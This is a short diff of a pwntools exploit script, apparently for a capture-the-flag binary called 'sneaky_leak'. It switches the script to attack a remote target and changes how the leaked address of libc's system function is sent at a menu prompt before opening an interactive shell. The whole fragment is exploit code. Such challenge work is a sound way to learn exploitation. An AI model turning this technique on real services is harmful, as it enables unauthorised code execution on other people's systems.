@@ -6,7 +6,7 @@ context.arch = "amd64"
 context.os = "linux"
 target_file = "./sneaky_leak"
 
-LOCAL = True
+LOCAL = False
 
 if LOCAL:
     # p = process(target_file)
@@ -68,6 +68,6 @@ print(f'system: {hex(system)}')
 
 menu(p, 4)
 p.recvuntil('> ')
-p.send(p64(system))
+p.send(str(system))
 
 p.interactive()
